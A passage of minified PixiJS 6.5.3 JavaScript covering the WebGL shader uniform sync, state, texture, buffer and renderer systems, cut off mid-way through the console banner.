this.cache[e]||(this.cache[e]=function(t,e){var i,r=["\n        var v = null;\n        var cv = null;\n        var cu = null;\n        var t = 0;\n        var gl = renderer.gl;\n    "];for(var n in t.uniforms){var s=e[n];if(s){for(var o=t.uniforms[n],a=!1,h=0;h<Qd.length;h++)if(Qd[h].test(s,o)){r.push(Qd[h].code(n,o)),a=!0;break}if(!a){var u=(1===s.size?Jd:tp)[s.type].replace("location",'ud["'+n+'"].location');r.push('\n            cu = ud["'+n+'"];\n            cv = cu.value;\n            v = uv["'+n+'"];\n            '+u+";")}}else(null===(i=t.uniforms[n])||void 0===i?void 0:i.group)&&(t.uniforms[n].ubo?r.push("\n                        renderer.shader.syncUniformBufferGroup(uv."+n+", '"+n+"');\n                    "):r.push("\n                        renderer.shader.syncUniformGroup(uv."+n+", syncData);\n                    "))}return new Function("ud","uv","renderer","syncData",r.join("\n"))}(t,this.shader.program.uniformData)),t.syncUniforms[this.shader.program.id]=this.cache[e],t.syncUniforms[this.shader.program.id]},t.prototype.syncUniformBufferGroup=function(t,e){var i=this.getGlProgram();if(!t.static||0!==t.dirtyId||!i.uniformGroups[t.id]){t.dirtyId=0;var r=i.uniformGroups[t.id]||this.createSyncBufferGroup(t,i,e);t.buffer.update(),r(i.uniformData,t.uniforms,this.renderer,Ap,t.buffer)}this.renderer.buffer.bindBufferBase(t.buffer,i.uniformBufferBindings[e])},t.prototype.createSyncBufferGroup=function(t,e,i){var r=this.renderer.gl;this.renderer.buffer.bind(t.buffer);var n=this.gl.getUniformBlockIndex(e.program,i);e.uniformBufferBindings[i]=this.shader.uniformBindCount,r.uniformBlockBinding(e.program,n,this.shader.uniformBindCount),this.shader.uniformBindCount++;var s=this.getSignature(t,this.shader.program.uniformData,"ubo"),o=this._uboCache[s];if(o||(o=this._uboCache[s]=function(t,e){if(!t.autoManage)return{size:0,syncFunc:bp};for(var i=function(t){for(var e=t.map((function(t){return{data:t,offset:0,dataLen:0,dirty:0}})),i=0,r=0,n=0,s=0;s<e.length;s++){var o=e[s];if(i=Dp[o.data.type],o.data.size>1&&(i=Math.max(i,16)*o.data.size),o.dataLen=i,r%i!=0&&r<16){var a=r%i%16;r+=a,n+=a}r+i>16?(n=16*Math.ceil(n/16),o.offset=n,n+=i,r=i):(o.offset=n,r+=i,n+=i)}return{uboElements:e,size:n=16*Math.ceil(n/16)}}(function(t,e){var i=[];for(var r in t)e[r]&&i.push(e[r]);return i.sort((function(t,e){return t.index-e.index})),i}(t.uniforms,e)),r=i.uboElements,n=i.size,s=["\n    var v = null;\n    var v2 = null;\n    var cv = null;\n    var t = 0;\n    var gl = renderer.gl\n    var index = 0;\n    var data = buffer.data;\n    "],o=0;o<r.length;o++){for(var a=r[o],h=t.uniforms[a.data.name],u=a.data.name,l=!1,c=0;c<Qd.length;c++){var d=Qd[c];if(d.codeUbo&&d.test(a.data,h)){s.push("offset = "+a.offset/4+";",Qd[c].codeUbo(a.data.name,h)),l=!0;break}}if(!l)if(a.data.size>1){var p=Wd(a.data.type),f=Math.max(Dp[a.data.type]/16,1),g=p/f,m=(4-g%4)%4;s.push("\n                cv = ud."+u+".value;\n                v = uv."+u+";\n                offset = "+a.offset/4+";\n\n                t = 0;\n\n                for(var i=0; i < "+a.data.size*f+"; i++)\n                {\n                    for(var j = 0; j < "+g+"; j++)\n                    {\n                        data[offset++] = v[t++];\n                    }\n                    offset += "+m+";\n                }\n\n                ")}else{var v=Tp[a.data.type];s.push("\n                cv = ud."+u+".value;\n                v = uv."+u+";\n                offset = "+a.offset/4+";\n                "+v+";\n                ")}}return s.push("\n       renderer.buffer.update(buffer);\n    "),{size:n,syncFunc:new Function("ud","uv","renderer","syncData","buffer",s.join("\n"))}}(t,this.shader.program.uniformData)),t.autoManage){var a=new Float32Array(o.size/4);t.buffer.update(a)}return e.uniformGroups[t.id]=o.syncFunc,e.uniformGroups[t.id]},t.prototype.getSignature=function(t,e,i){var r=t.uniforms,n=[i+"-"];for(var s in r)n.push(s),e[s]&&n.push(e[s].type);return n.join("-")},t.prototype.getGlProgram=function(){return this.shader?this.shader.program.glPrograms[this.renderer.CONTEXT_UID]:null},t.prototype.generateProgram=function(t){var e=this.gl,i=t.program,r=function(t,e){var i=Ud(t,t.VERTEX_SHADER,e.vertexSrc),r=Ud(t,t.FRAGMENT_SHADER,e.fragmentSrc),n=t.createProgram();if(t.attachShader(n,i),t.attachShader(n,r),t.linkProgram(n),t.getProgramParameter(n,t.LINK_STATUS)||function(t,e,i,r){t.getProgramParameter(e,t.LINK_STATUS)||(t.getShaderParameter(i,t.COMPILE_STATUS)||kd(t,i),t.getShaderParameter(r,t.COMPILE_STATUS)||kd(t,r),console.error("PixiJS Error: Could not initialize shader."),""!==t.getProgramInfoLog(e)&&console.warn("PixiJS Warning: gl.getProgramInfoLog()",t.getProgramInfoLog(e)))}(t,n,i,r),e.attributeData=function(t,e){for(var i={},r=e.getProgramParameter(t,e.ACTIVE_ATTRIBUTES),n=0;n<r;n++){var s=e.getActiveAttrib(t,n);if(0!==s.name.indexOf("gl_")){var o=Zd(e,s.type),a={type:o,name:s.name,size:Wd(o),location:e.getAttribLocation(t,s.name)};i[s.name]=a}}return i}(n,t),e.uniformData=function(t,e){for(var i={},r=e.getProgramParameter(t,e.ACTIVE_UNIFORMS),n=0;n<r;n++){var s=e.getActiveUniform(t,n),o=s.name.replace(/\[.*?\]$/,""),a=!!s.name.match(/\[.*?\]$/),h=Zd(e,s.type);i[o]={name:o,index:n,type:h,size:s.size,isArray:a,value:Hd(h,s.size)}}return i}(n,t),!/^[ \t]*#[ \t]*version[ \t]+300[ \t]+es[ \t]*$/m.test(e.vertexSrc)){var s=Object.keys(e.attributeData);s.sort((function(t,e){return t>e?1:-1}));for(var o=0;o<s.length;o++)e.attributeData[s[o]].location=o,t.bindAttribLocation(n,o,s[o]);t.linkProgram(n)}t.deleteShader(i),t.deleteShader(r);var a={};for(var o in e.uniformData){var h=e.uniformData[o];a[o]={location:t.getUniformLocation(n,o),value:Hd(h.type,h.size)}}return new wp(n,a)}(e,i);return i.glPrograms[this.renderer.CONTEXT_UID]=r,r},t.prototype.reset=function(){this.program=null,this.shader=null},t.prototype.destroy=function(){this.renderer=null,this.destroyed=!0},t}(),Ip=function(){function t(){this.gl=null,this.stateId=0,this.polygonOffset=0,this.blendMode=tl.NONE,this._blendEq=!1,this.map=[],this.map[0]=this.setBlend,this.map[1]=this.setOffset,this.map[2]=this.setCullFace,this.map[3]=this.setDepthTest,this.map[4]=this.setFrontFace,this.map[5]=this.setDepthMask,this.checks=[],this.defaultState=new ap,this.defaultState.blend=!0}return t.prototype.contextChange=function(t){this.gl=t,this.blendModes=function(t,e){return void 0===e&&(e=[]),e[tl.NORMAL]=[t.ONE,t.ONE_MINUS_SRC_ALPHA],e[tl.ADD]=[t.ONE,t.ONE],e[tl.MULTIPLY]=[t.DST_COLOR,t.ONE_MINUS_SRC_ALPHA,t.ONE,t.ONE_MINUS_SRC_ALPHA],e[tl.SCREEN]=[t.ONE,t.ONE_MINUS_SRC_COLOR,t.ONE,t.ONE_MINUS_SRC_ALPHA],e[tl.OVERLAY]=[t.ONE,t.ONE_MINUS_SRC_ALPHA],e[tl.DARKEN]=[t.ONE,t.ONE_MINUS_SRC_ALPHA],e[tl.LIGHTEN]=[t.ONE,t.ONE_MINUS_SRC_ALPHA],e[tl.COLOR_DODGE]=[t.ONE,t.ONE_MINUS_SRC_ALPHA],e[tl.COLOR_BURN]=[t.ONE,t.ONE_MINUS_SRC_ALPHA],e[tl.HARD_LIGHT]=[t.ONE,t.ONE_MINUS_SRC_ALPHA],e[tl.SOFT_LIGHT]=[t.ONE,t.ONE_MINUS_SRC_ALPHA],e[tl.DIFFERENCE]=[t.ONE,t.ONE_MINUS_SRC_ALPHA],e[tl.EXCLUSION]=[t.ONE,t.ONE_MINUS_SRC_ALPHA],e[tl.HUE]=[t.ONE,t.ONE_MINUS_SRC_ALPHA],e[tl.SATURATION]=[t.ONE,t.ONE_MINUS_SRC_ALPHA],e[tl.COLOR]=[t.ONE,t.ONE_MINUS_SRC_ALPHA],e[tl.LUMINOSITY]=[t.ONE,t.ONE_MINUS_SRC_ALPHA],e[tl.NONE]=[0,0],e[tl.NORMAL_NPM]=[t.SRC_ALPHA,t.ONE_MINUS_SRC_ALPHA,t.ONE,t.ONE_MINUS_SRC_ALPHA],e[tl.ADD_NPM]=[t.SRC_ALPHA,t.ONE,t.ONE,t.ONE],e[tl.SCREEN_NPM]=[t.SRC_ALPHA,t.ONE_MINUS_SRC_COLOR,t.ONE,t.ONE_MINUS_SRC_ALPHA],e[tl.SRC_IN]=[t.DST_ALPHA,t.ZERO],e[tl.SRC_OUT]=[t.ONE_MINUS_DST_ALPHA,t.ZERO],e[tl.SRC_ATOP]=[t.DST_ALPHA,t.ONE_MINUS_SRC_ALPHA],e[tl.DST_OVER]=[t.ONE_MINUS_DST_ALPHA,t.ONE],e[tl.DST_IN]=[t.ZERO,t.SRC_ALPHA],e[tl.DST_OUT]=[t.ZERO,t.ONE_MINUS_SRC_ALPHA],e[tl.DST_ATOP]=[t.ONE_MINUS_DST_ALPHA,t.SRC_ALPHA],e[tl.XOR]=[t.ONE_MINUS_DST_ALPHA,t.ONE_MINUS_SRC_ALPHA],e[tl.SUBTRACT]=[t.ONE,t.ONE,t.ONE,t.ONE,t.FUNC_REVERSE_SUBTRACT,t.FUNC_ADD],e}(t),this.set(this.defaultState),this.reset()},t.prototype.set=function(t){if(t=t||this.defaultState,this.stateId!==t.data){for(var e=this.stateId^t.data,i=0;e;)1&e&&this.map[i].call(this,!!(t.data&1<<i)),e>>=1,i++;this.stateId=t.data}for(i=0;i<this.checks.length;i++)this.checks[i](this,t)},t.prototype.forceState=function(t){t=t||this.defaultState;for(var e=0;e<this.map.length;e++)this.map[e].call(this,!!(t.data&1<<e));for(e=0;e<this.checks.length;e++)this.checks[e](this,t);this.stateId=t.data},t.prototype.setBlend=function(e){this.updateCheck(t.checkBlendMode,e),this.gl[e?"enable":"disable"](this.gl.BLEND)},t.prototype.setOffset=function(e){this.updateCheck(t.checkPolygonOffset,e),this.gl[e?"enable":"disable"](this.gl.POLYGON_OFFSET_FILL)},t.prototype.setDepthTest=function(t){this.gl[t?"enable":"disable"](this.gl.DEPTH_TEST)},t.prototype.setDepthMask=function(t){this.gl.depthMask(t)},t.prototype.setCullFace=function(t){this.gl[t?"enable":"disable"](this.gl.CULL_FACE)},t.prototype.setFrontFace=function(t){this.gl.frontFace(this.gl[t?"CW":"CCW"])},t.prototype.setBlendMode=function(t){if(t!==this.blendMode){this.blendMode=t;var e=this.blendModes[t],i=this.gl;2===e.length?i.blendFunc(e[0],e[1]):i.blendFuncSeparate(e[0],e[1],e[2],e[3]),6===e.length?(this._blendEq=!0,i.blendEquationSeparate(e[4],e[5])):this._blendEq&&(this._blendEq=!1,i.blendEquationSeparate(i.FUNC_ADD,i.FUNC_ADD))}},t.prototype.setPolygonOffset=function(t,e){this.gl.polygonOffset(t,e)},t.prototype.reset=function(){this.gl.pixelStorei(this.gl.UNPACK_FLIP_Y_WEBGL,!1),this.forceState(this.defaultState),this._blendEq=!0,this.blendMode=-1,this.setBlendMode(0)},t.prototype.updateCheck=function(t,e){var i=this.checks.indexOf(t);e&&-1===i?this.checks.push(t):e||-1===i||this.checks.splice(i,1)},t.checkBlendMode=function(t,e){t.setBlendMode(e.blendMode)},t.checkPolygonOffset=function(t,e){t.setPolygonOffset(1,e.polygonOffset)},t.prototype.destroy=function(){this.gl=null},t}(),Rp=function(){function t(t){this.renderer=t,this.count=0,this.checkCount=0,this.maxIdle=Fl.GC_MAX_IDLE,this.checkCountMax=Fl.GC_MAX_CHECK_COUNT,this.mode=Fl.GC_MODE}return t.prototype.postrender=function(){this.renderer.renderingToScreen&&(this.count++,this.mode!==cl.MANUAL&&(this.checkCount++,this.checkCount>this.checkCountMax&&(this.checkCount=0,this.run())))},t.prototype.run=function(){for(var t=this.renderer.texture,e=t.managedTextures,i=!1,r=0;r<e.length;r++){var n=e[r];!n.framebuffer&&this.count-n.touched>this.maxIdle&&(t.destroyTexture(n,!0),e[r]=null,i=!0)}if(i){var s=0;for(r=0;r<e.length;r++)null!==e[r]&&(e[s++]=e[r]);e.length=s}},t.prototype.unload=function(t){var e=this.renderer.texture,i=t._texture;i&&!i.framebuffer&&e.destroyTexture(i);for(var r=t.children.length-1;r>=0;r--)this.unload(t.children[r])},t.prototype.destroy=function(){this.renderer=null},t}(),Pp=function(t){this.texture=t,this.width=-1,this.height=-1,this.dirtyId=-1,this.dirtyStyleId=-1,this.mipmap=!1,this.wrapMode=33071,this.type=nl.UNSIGNED_BYTE,this.internalFormat=il.RGBA,this.samplerType=0},Op=function(){function t(t){this.renderer=t,this.boundTextures=[],this.currentLocation=-1,this.managedTextures=[],this._unknownBoundTextures=!1,this.unknownTexture=new $c,this.hasIntegerTextures=!1}return t.prototype.contextChange=function(){var t=this.gl=this.renderer.gl;this.CONTEXT_UID=this.renderer.CONTEXT_UID,this.webGLVersion=this.renderer.context.webGLVersion,this.internalFormats=function(t){var e,i,r,n,s,o,a,h,u,l,c,d,p,f,g,m,v,_,y,x,E,b,T;return"WebGL2RenderingContext"in globalThis&&t instanceof globalThis.WebGL2RenderingContext?((e={})[nl.UNSIGNED_BYTE]=((i={})[il.RGBA]=t.RGBA8,i[il.RGB]=t.RGB8,i[il.RG]=t.RG8,i[il.RED]=t.R8,i[il.RGBA_INTEGER]=t.RGBA8UI,i[il.RGB_INTEGER]=t.RGB8UI,i[il.RG_INTEGER]=t.RG8UI,i[il.RED_INTEGER]=t.R8UI,i[il.ALPHA]=t.ALPHA,i[il.LUMINANCE]=t.LUMINANCE,i[il.LUMINANCE_ALPHA]=t.LUMINANCE_ALPHA,i),e[nl.BYTE]=((r={})[il.RGBA]=t.RGBA8_SNORM,r[il.RGB]=t.RGB8_SNORM,r[il.RG]=t.RG8_SNORM,r[il.RED]=t.R8_SNORM,r[il.RGBA_INTEGER]=t.RGBA8I,r[il.RGB_INTEGER]=t.RGB8I,r[il.RG_INTEGER]=t.RG8I,r[il.RED_INTEGER]=t.R8I,r),e[nl.UNSIGNED_SHORT]=((n={})[il.RGBA_INTEGER]=t.RGBA16UI,n[il.RGB_INTEGER]=t.RGB16UI,n[il.RG_INTEGER]=t.RG16UI,n[il.RED_INTEGER]=t.R16UI,n[il.DEPTH_COMPONENT]=t.DEPTH_COMPONENT16,n),e[nl.SHORT]=((s={})[il.RGBA_INTEGER]=t.RGBA16I,s[il.RGB_INTEGER]=t.RGB16I,s[il.RG_INTEGER]=t.RG16I,s[il.RED_INTEGER]=t.R16I,s),e[nl.UNSIGNED_INT]=((o={})[il.RGBA_INTEGER]=t.RGBA32UI,o[il.RGB_INTEGER]=t.RGB32UI,o[il.RG_INTEGER]=t.RG32UI,o[il.RED_INTEGER]=t.R32UI,o[il.DEPTH_COMPONENT]=t.DEPTH_COMPONENT24,o),e[nl.INT]=((a={})[il.RGBA_INTEGER]=t.RGBA32I,a[il.RGB_INTEGER]=t.RGB32I,a[il.RG_INTEGER]=t.RG32I,a[il.RED_INTEGER]=t.R32I,a),e[nl.FLOAT]=((h={})[il.RGBA]=t.RGBA32F,h[il.RGB]=t.RGB32F,h[il.RG]=t.RG32F,h[il.RED]=t.R32F,h[il.DEPTH_COMPONENT]=t.DEPTH_COMPONENT32F,h),e[nl.HALF_FLOAT]=((u={})[il.RGBA]=t.RGBA16F,u[il.RGB]=t.RGB16F,u[il.RG]=t.RG16F,u[il.RED]=t.R16F,u),e[nl.UNSIGNED_SHORT_5_6_5]=((l={})[il.RGB]=t.RGB565,l),e[nl.UNSIGNED_SHORT_4_4_4_4]=((c={})[il.RGBA]=t.RGBA4,c),e[nl.UNSIGNED_SHORT_5_5_5_1]=((d={})[il.RGBA]=t.RGB5_A1,d),e[nl.UNSIGNED_INT_2_10_10_10_REV]=((p={})[il.RGBA]=t.RGB10_A2,p[il.RGBA_INTEGER]=t.RGB10_A2UI,p),e[nl.UNSIGNED_INT_10F_11F_11F_REV]=((f={})[il.RGB]=t.R11F_G11F_B10F,f),e[nl.UNSIGNED_INT_5_9_9_9_REV]=((g={})[il.RGB]=t.RGB9_E5,g),e[nl.UNSIGNED_INT_24_8]=((m={})[il.DEPTH_STENCIL]=t.DEPTH24_STENCIL8,m),e[nl.FLOAT_32_UNSIGNED_INT_24_8_REV]=((v={})[il.DEPTH_STENCIL]=t.DEPTH32F_STENCIL8,v),T=e):((_={})[nl.UNSIGNED_BYTE]=((y={})[il.RGBA]=t.RGBA,y[il.RGB]=t.RGB,y[il.ALPHA]=t.ALPHA,y[il.LUMINANCE]=t.LUMINANCE,y[il.LUMINANCE_ALPHA]=t.LUMINANCE_ALPHA,y),_[nl.UNSIGNED_SHORT_5_6_5]=((x={})[il.RGB]=t.RGB,x),_[nl.UNSIGNED_SHORT_4_4_4_4]=((E={})[il.RGBA]=t.RGBA,E),_[nl.UNSIGNED_SHORT_5_5_5_1]=((b={})[il.RGBA]=t.RGBA,b),T=_),T}(t);var e=t.getParameter(t.MAX_TEXTURE_IMAGE_UNITS);this.boundTextures.length=e;for(var i=0;i<e;i++)this.boundTextures[i]=null;this.emptyTextures={};var r=new Pp(t.createTexture());for(t.bindTexture(t.TEXTURE_2D,r.texture),t.texImage2D(t.TEXTURE_2D,0,t.RGBA,1,1,0,t.RGBA,t.UNSIGNED_BYTE,new Uint8Array(4)),this.emptyTextures[t.TEXTURE_2D]=r,this.emptyTextures[t.TEXTURE_CUBE_MAP]=new Pp(t.createTexture()),t.bindTexture(t.TEXTURE_CUBE_MAP,this.emptyTextures[t.TEXTURE_CUBE_MAP].texture),i=0;i<6;i++)t.texImage2D(t.TEXTURE_CUBE_MAP_POSITIVE_X+i,0,t.RGBA,1,1,0,t.RGBA,t.UNSIGNED_BYTE,null);for(t.texParameteri(t.TEXTURE_CUBE_MAP,t.TEXTURE_MAG_FILTER,t.LINEAR),t.texParameteri(t.TEXTURE_CUBE_MAP,t.TEXTURE_MIN_FILTER,t.LINEAR),i=0;i<this.boundTextures.length;i++)this.bind(null,i)},t.prototype.bind=function(t,e){void 0===e&&(e=0);var i=this.gl;if((t=null==t?void 0:t.castToBaseTexture())&&t.valid&&!t.parentTextureArray){t.touched=this.renderer.textureGC.count;var r=t._glTextures[this.CONTEXT_UID]||this.initTexture(t);this.boundTextures[e]!==t&&(this.currentLocation!==e&&(this.currentLocation=e,i.activeTexture(i.TEXTURE0+e)),i.bindTexture(t.target,r.texture)),r.dirtyId!==t.dirtyId&&(this.currentLocation!==e&&(this.currentLocation=e,i.activeTexture(i.TEXTURE0+e)),this.updateTexture(t)),this.boundTextures[e]=t}else this.currentLocation!==e&&(this.currentLocation=e,i.activeTexture(i.TEXTURE0+e)),i.bindTexture(i.TEXTURE_2D,this.emptyTextures[i.TEXTURE_2D].texture),this.boundTextures[e]=null},t.prototype.reset=function(){this._unknownBoundTextures=!0,this.hasIntegerTextures=!1,this.currentLocation=-1;for(var t=0;t<this.boundTextures.length;t++)this.boundTextures[t]=this.unknownTexture},t.prototype.unbind=function(t){var e=this.gl,i=this.boundTextures;if(this._unknownBoundTextures){this._unknownBoundTextures=!1;for(var r=0;r<i.length;r++)i[r]===this.unknownTexture&&this.bind(null,r)}for(r=0;r<i.length;r++)i[r]===t&&(this.currentLocation!==r&&(e.activeTexture(e.TEXTURE0+r),this.currentLocation=r),e.bindTexture(t.target,this.emptyTextures[t.target].texture),i[r]=null)},t.prototype.ensureSamplerType=function(t){var e=this,i=e.boundTextures,r=e.hasIntegerTextures,n=e.CONTEXT_UID;if(r)for(var s=t-1;s>=0;--s){var o=i[s];o&&o._glTextures[n].samplerType!==sl.FLOAT&&this.renderer.texture.unbind(o)}},t.prototype.initTexture=function(t){var e=new Pp(this.gl.createTexture());return e.dirtyId=-1,t._glTextures[this.CONTEXT_UID]=e,this.managedTextures.push(t),t.on("dispose",this.destroyTexture,this),e},t.prototype.initTextureType=function(t,e){var i,r;e.internalFormat=null!==(r=null===(i=this.internalFormats[t.type])||void 0===i?void 0:i[t.format])&&void 0!==r?r:t.format,2===this.webGLVersion&&t.type===nl.HALF_FLOAT?e.type=this.gl.HALF_FLOAT:e.type=t.type},t.prototype.updateTexture=function(t){var e=t._glTextures[this.CONTEXT_UID];if(e){var i=this.renderer;if(this.initTextureType(t,e),t.resource&&t.resource.upload(i,t,e))e.samplerType!==sl.FLOAT&&(this.hasIntegerTextures=!0);else{var r=t.realWidth,n=t.realHeight,s=i.gl;(e.width!==r||e.height!==n||e.dirtyId<0)&&(e.width=r,e.height=n,s.texImage2D(t.target,0,e.internalFormat,r,n,0,t.format,e.type,null))}t.dirtyStyleId!==e.dirtyStyleId&&this.updateTextureStyle(t),e.dirtyId=t.dirtyId}},t.prototype.destroyTexture=function(t,e){var i=this.gl;if((t=t.castToBaseTexture())._glTextures[this.CONTEXT_UID]&&(this.unbind(t),i.deleteTexture(t._glTextures[this.CONTEXT_UID].texture),t.off("dispose",this.destroyTexture,this),delete t._glTextures[this.CONTEXT_UID],!e)){var r=this.managedTextures.indexOf(t);-1!==r&&Zl(this.managedTextures,r,1)}},t.prototype.updateTextureStyle=function(t){var e=t._glTextures[this.CONTEXT_UID];e&&(t.mipmap!==hl.POW2&&2===this.webGLVersion||t.isPowerOfTwo?e.mipmap=t.mipmap>=1:e.mipmap=!1,2===this.webGLVersion||t.isPowerOfTwo?e.wrapMode=t.wrapMode:e.wrapMode=al.CLAMP,t.resource&&t.resource.style(this.renderer,t,e)||this.setStyle(t,e),e.dirtyStyleId=t.dirtyStyleId)},t.prototype.setStyle=function(t,e){var i=this.gl;if(e.mipmap&&t.mipmap!==hl.ON_MANUAL&&i.generateMipmap(t.target),i.texParameteri(t.target,i.TEXTURE_WRAP_S,e.wrapMode),i.texParameteri(t.target,i.TEXTURE_WRAP_T,e.wrapMode),e.mipmap){i.texParameteri(t.target,i.TEXTURE_MIN_FILTER,t.scaleMode===ol.LINEAR?i.LINEAR_MIPMAP_LINEAR:i.NEAREST_MIPMAP_NEAREST);var r=this.renderer.context.extensions.anisotropicFiltering;if(r&&t.anisotropicLevel>0&&t.scaleMode===ol.LINEAR){var n=Math.min(t.anisotropicLevel,i.getParameter(r.MAX_TEXTURE_MAX_ANISOTROPY_EXT));i.texParameterf(t.target,r.TEXTURE_MAX_ANISOTROPY_EXT,n)}}else i.texParameteri(t.target,i.TEXTURE_MIN_FILTER,t.scaleMode===ol.LINEAR?i.LINEAR:i.NEAREST);i.texParameteri(t.target,i.TEXTURE_MAG_FILTER,t.scaleMode===ol.LINEAR?i.LINEAR:i.NEAREST)},t.prototype.destroy=function(){this.renderer=null},t}(),Np={__proto__:null,FilterSystem:Ad,BatchSystem:Id,ContextSystem:Pd,FramebufferSystem:Md,GeometrySystem:Ld,MaskSystem:dp,ScissorSystem:mp,StencilSystem:vp,ProjectionSystem:_p,RenderTextureSystem:Ep,ShaderSystem:Cp,StateSystem:Ip,TextureGCSystem:Rp,TextureSystem:Op},Mp=new Cc,Fp=function(t){function e(e,i){void 0===e&&(e=Qu.UNKNOWN);var r=t.call(this)||this;return i=Object.assign({},Fl.RENDER_OPTIONS,i),r.options=i,r.type=e,r.screen=new bc(0,0,i.width,i.height),r.view=i.view||Fl.ADAPTER.createCanvas(),r.resolution=i.resolution||Fl.RESOLUTION,r.useContextAlpha=i.useContextAlpha,r.autoDensity=!!i.autoDensity,r.preserveDrawingBuffer=i.preserveDrawingBuffer,r.clearBeforeRender=i.clearBeforeRender,r._backgroundColor=0,r._backgroundColorRgba=[0,0,0,1],r._backgroundColorString="#000000",r.backgroundColor=i.backgroundColor||r._backgroundColor,r.backgroundAlpha=i.backgroundAlpha,void 0!==i.transparent&&(ec("6.0.0","Option transparent is deprecated, please use backgroundAlpha instead."),r.useContextAlpha=i.transparent,r.backgroundAlpha=i.transparent?0:1),r._lastObjectRendered=null,r.plugins={},r}return Hc(e,t),e.prototype.initPlugins=function(t){for(var e in t)this.plugins[e]=new t[e](this)},Object.defineProperty(e.prototype,"width",{get:function(){return this.view.width},enumerable:!1,configurable:!0}),Object.defineProperty(e.prototype,"height",{get:function(){return this.view.height},enumerable:!1,configurable:!0}),e.prototype.resize=function(t,e){this.view.width=Math.round(t*this.resolution),this.view.height=Math.round(e*this.resolution);var i=this.view.width/this.resolution,r=this.view.height/this.resolution;this.screen.width=i,this.screen.height=r,this.autoDensity&&(this.view.style.width=i+"px",this.view.style.height=r+"px"),this.emit("resize",i,r)},e.prototype.generateTexture=function(t,e,i,r){void 0===e&&(e={}),"number"==typeof e&&(ec("6.1.0","generateTexture options (scaleMode, resolution, region) are now object options."),e={scaleMode:e,resolution:i,region:r});var n=e.region,s=function(t,e){var i={};for(var r in t)Object.prototype.hasOwnProperty.call(t,r)&&e.indexOf(r)<0&&(i[r]=t[r]);if(null!=t&&"function"==typeof Object.getOwnPropertySymbols){var n=0;for(r=Object.getOwnPropertySymbols(t);n<r.length;n++)e.indexOf(r[n])<0&&Object.prototype.propertyIsEnumerable.call(t,r[n])&&(i[r[n]]=t[r[n]])}return i}(e,["region"]);0===(r=n||t.getLocalBounds(null,!0)).width&&(r.width=1),0===r.height&&(r.height=1);var o=ld.create(zc({width:r.width,height:r.height},s));return Mp.tx=-r.x,Mp.ty=-r.y,this.render(t,{renderTexture:o,clear:!1,transform:Mp,skipUpdateTransform:!!t.parent}),o},e.prototype.destroy=function(t){for(var e in this.plugins)this.plugins[e].destroy(),this.plugins[e]=null;t&&this.view.parentNode&&this.view.parentNode.removeChild(this.view);var i=this;i.plugins=null,i.type=Qu.UNKNOWN,i.view=null,i.screen=null,i._tempDisplayObjectParent=null,i.options=null,this._backgroundColorRgba=null,this._backgroundColorString=null,this._lastObjectRendered=null},Object.defineProperty(e.prototype,"backgroundColor",{get:function(){return this._backgroundColor},set:function(t){var e;this._backgroundColor=t,this._backgroundColorString=(e=t.toString(16),"#"+("000000".substring(0,6-e.length)+e)),zl(t,this._backgroundColorRgba)},enumerable:!1,configurable:!0}),Object.defineProperty(e.prototype,"backgroundAlpha",{get:function(){return this._backgroundColorRgba[3]},set:function(t){this._backgroundColorRgba[3]=t},enumerable:!1,configurable:!0}),e}(Ll),Lp=function(t){this.buffer=t||null,this.updateID=-1,this.byteLength=-1,this.refCount=0},Bp=function(){function t(t){this.renderer=t,this.managedBuffers={},this.boundBufferBases={}}return t.prototype.destroy=function(){this.renderer=null},t.prototype.contextChange=function(){this.disposeAll(!0),this.gl=this.renderer.gl,this.CONTEXT_UID=this.renderer.CONTEXT_UID},t.prototype.bind=function(t){var e=this.gl,i=this.CONTEXT_UID,r=t._glBuffers[i]||this.createGLBuffer(t);e.bindBuffer(t.type,r.buffer)},t.prototype.bindBufferBase=function(t,e){var i=this.gl,r=this.CONTEXT_UID;if(this.boundBufferBases[e]!==t){var n=t._glBuffers[r]||this.createGLBuffer(t);this.boundBufferBases[e]=t,i.bindBufferBase(i.UNIFORM_BUFFER,e,n.buffer)}},t.prototype.bindBufferRange=function(t,e,i){var r=this.gl,n=this.CONTEXT_UID;i=i||0;var s=t._glBuffers[n]||this.createGLBuffer(t);r.bindBufferRange(r.UNIFORM_BUFFER,e||0,s.buffer,256*i,256)},t.prototype.update=function(t){var e=this.gl,i=this.CONTEXT_UID,r=t._glBuffers[i];if(t._updateID!==r.updateID)if(r.updateID=t._updateID,e.bindBuffer(t.type,r.buffer),r.byteLength>=t.data.byteLength)e.bufferSubData(t.type,0,t.data);else{var n=t.static?e.STATIC_DRAW:e.DYNAMIC_DRAW;r.byteLength=t.data.byteLength,e.bufferData(t.type,t.data,n)}},t.prototype.dispose=function(t,e){if(this.managedBuffers[t.id]){delete this.managedBuffers[t.id];var i=t._glBuffers[this.CONTEXT_UID],r=this.gl;t.disposeRunner.remove(this),i&&(e||r.deleteBuffer(i.buffer),delete t._glBuffers[this.CONTEXT_UID])}},t.prototype.disposeAll=function(t){for(var e=Object.keys(this.managedBuffers),i=0;i<e.length;i++)this.dispose(this.managedBuffers[e[i]],t)},t.prototype.createGLBuffer=function(t){var e=this.CONTEXT_UID,i=this.gl;return t._glBuffers[e]=new Lp(i.createBuffer()),this.managedBuffers[t.id]=t,t.disposeRunner.add(this),t._glBuffers[e]},t}(),Up=function(t){function e(i){var r=t.call(this,Qu.WEBGL,i)||this;return i=r.options,r.gl=null,r.CONTEXT_UID=0,r.runners={destroy:new dc("destroy"),contextChange:new dc("contextChange"),reset:new dc("reset"),update:new dc("update"),postrender:new dc("postrender"),prerender:new dc("prerender"),resize:new dc("resize")},r.runners.contextChange.add(r),r.globalUniforms=new Td({projectionMatrix:new Cc},!0),r.addSystem(dp,"mask").addSystem(Pd,"context").addSystem(Ip,"state").addSystem(Cp,"shader").addSystem(Op,"texture").addSystem(Bp,"buffer").addSystem(Ld,"geometry").addSystem(Md,"framebuffer").addSystem(mp,"scissor").addSystem(vp,"stencil").addSystem(_p,"projection").addSystem(Rp,"textureGC").addSystem(Ad,"filter").addSystem(Ep,"renderTexture").addSystem(Id,"batch"),r.initPlugins(e.__plugins),r.multisample=void 0,i.context?r.context.initFromContext(i.context):r.context.initFromOptions({alpha:!!r.useContextAlpha,antialias:i.antialias,premultipliedAlpha:r.useContextAlpha&&"notMultiplied"!==r.useContextAlpha,stencil:!0,preserveDrawingBuffer:i.preserveDrawingBuffer,powerPreference:r.options.powerPreference}),r.renderingToScreen=!0,function(t){var e;if(!Hl){if(Fl.ADAPTER.getNavigator().userAgent.toLowerCase().indexOf("chrome")>-1){var i=["\n %c %c %c PixiJS 6.5.3 - ✰ "+t+" ✰  %c  %c  http://www.pixijs.com/  %c %c ♥%c♥%c♥ 